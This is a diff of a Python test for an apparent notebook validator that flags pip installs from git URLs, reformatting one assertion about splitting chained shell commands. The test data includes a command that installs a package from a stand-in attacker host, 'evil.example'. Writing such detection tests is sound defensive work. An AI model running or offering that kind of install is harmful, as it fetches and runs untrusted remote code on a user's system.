@@ -5329,7 +5329,10 @@ def test_a_definition_behind_a_body_keyword_is_still_read():
     assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
     # Uncalled, the body is still unreachable rather than merely conditional.
     assert "!pip install git+https://evil.example/x.git" not in [
-        text for text, _ in nv._split_chained("!if true; then f(){ pip install git+https://evil.example/x.git; }; fi")
+        text
+        for text, _ in nv._split_chained(
+            "!if true; then f(){ pip install git+https://evil.example/x.git; }; fi"
+        )
     ]
 
 
